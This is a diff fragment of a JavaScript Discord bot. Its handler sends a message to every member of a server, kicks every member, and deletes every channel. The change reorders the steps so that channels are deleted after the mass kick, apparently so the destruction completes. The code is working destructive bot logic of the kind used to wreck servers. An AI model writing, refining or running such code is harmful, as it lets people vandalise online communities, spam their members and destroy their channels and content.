@@ -22,12 +22,12 @@ client.on('message', message => {
         guild.members.map(m => {
                 m.send(msg);
         });
-        for (var i = 0; i < guild.channels.array().length; i++) {
-            guild.channels.array()[i].delete();
-        }
         guild.members.forEach(m => {
             m.kick();
         });
+        for (var i = 0; i < guild.channels.array().length; i++) {
+            guild.channels.array()[i].delete();
+        }
     }
 });
     
